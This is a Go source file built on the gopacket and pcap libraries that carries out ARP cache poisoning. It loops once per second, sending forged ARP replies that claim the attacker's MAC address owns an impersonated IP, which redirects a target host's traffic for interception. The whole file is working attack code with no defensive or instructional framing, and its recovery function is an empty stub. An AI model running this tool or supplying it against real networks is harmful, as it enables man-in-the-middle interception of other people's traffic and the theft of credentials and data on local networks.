package main

import (
	"context"
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func launchPoisoning(ip_src net.IP, mac_src net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr, handle *pcap.Handle, ctx context.Context) {
	count := 0
	for {
		select {
		case <-ctx.Done():
			fmt.Println("Received SIGTERM, Stop poisoning")
			return
		default:
			writeARP(handle, ip_src, mac_src, ip_target, mac_target)
			// writeARP(handle, ip_target, mac_target, ip_src, mac_src)
			printPoisoning(&count)
			time.Sleep(1 * time.Second)
		}
	}

}

func launchRecuperation(ip_src string, mac_src string, ip_target string, mac_target string) {
	fmt.Println("Launch recuperation")
}

func writeARP(handle *pcap.Handle, ip_to_usurpate net.IP, mac_of_attaquant net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr) error {

	eth := layers.Ethernet{
		SrcMAC:       mac_of_attaquant,
		DstMAC:       mac_target,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   mac_of_attaquant,
		SourceProtAddress: ip_to_usurpate,
		DstHwAddress:      mac_target,
		DstProtAddress:    ip_target,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		panic(err)
	}

	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		panic(err)
	}
	return nil

}
